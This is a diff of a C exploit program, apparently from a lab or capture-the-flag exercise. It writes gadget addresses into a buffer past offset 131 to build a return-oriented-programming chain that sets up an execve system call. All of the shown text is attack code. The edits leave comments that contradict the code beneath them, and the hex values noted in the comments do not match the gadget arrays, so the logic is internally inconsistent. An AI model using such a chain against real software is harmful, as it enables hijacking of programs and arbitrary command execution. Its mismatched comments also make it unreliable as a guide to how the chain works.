@@ -20,8 +20,7 @@ int main(void)
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
   char pop_ecx[] = "\x22\xa4\xba\xbb";
   char add_dl_al[] = "\x07\x46\xbb\xbb";
-  char write_at_ecx_from_edx[] = "\x7e\xb8\x6b\xbb"; 
-  char write_at_edx_from_eax[] = "\x79\x2d\x5b\xbb"; 
+  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb"; 
 
   char exec_arg[] = "\x3b\x01\x01\x01";
 
@@ -32,15 +31,15 @@ int main(void)
 
   // overwrite ebp
   // pop arg into edx
-  strcpy(bufr + 131, xor_eax); // 0xbbb9dc1b
-  strcpy(bufr + 135, pop_edx);
+  strcpy(bufr + 131, xor_edx); // 0xbbb9dc1b
+  strcpy(bufr + 135, pop_ecx);
   // clear eax
   strcpy(bufr + 139, null_arg_addr); // 0xbba9b3c2
   // add last 8 bits of edx to eax
-  strcpy(bufr + 143, write_at_edx_from_eax); // 0xbbbb4607
+  strcpy(bufr + 143, write_at_ecx_from_edx); // 0xbbbb4607
                                  // eax now holds 0x3b (59)
   // clear edx 
-  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
+  strcpy(bufr + 147, pop_edx); // 0xbbb3bed4
   // pop null args address into ecx
   strcpy(bufr + 151, exec_arg); // 0xbbbaa422
   strcpy(bufr + 155, xor_eax); // = 0xbfbf588c
